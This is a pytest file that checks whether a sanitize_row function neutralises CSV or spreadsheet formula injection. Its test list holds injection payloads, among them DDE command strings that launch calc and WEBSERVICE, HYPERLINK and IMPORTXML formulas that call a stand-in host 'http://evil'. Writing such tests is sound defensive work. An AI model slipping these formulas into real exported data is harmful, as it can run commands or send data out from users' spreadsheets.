import pytest

from csv_formula import sanitize_row

BAD_CELLS = [
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1:A2)",
    "\t=1+1",
    "\r=1+1",
    "=cmd|' /C calc'!A0",
    "=HYPERLINK(\"http://evil\")",
    "=WEBSERVICE(\"http://evil\")",
    " =1+1",
    "\u0000=1+1",
    "=1+1\n",
    "+cmd|' /C calc'!A0",
    "-2+3",
    "@IMPORTXML(\"http://evil\")",
]


@pytest.mark.parametrize("cell", BAD_CELLS)
def test_formula_cell_is_neutralized(cell):
    out = sanitize_row([cell])
    assert out[0].startswith("'")
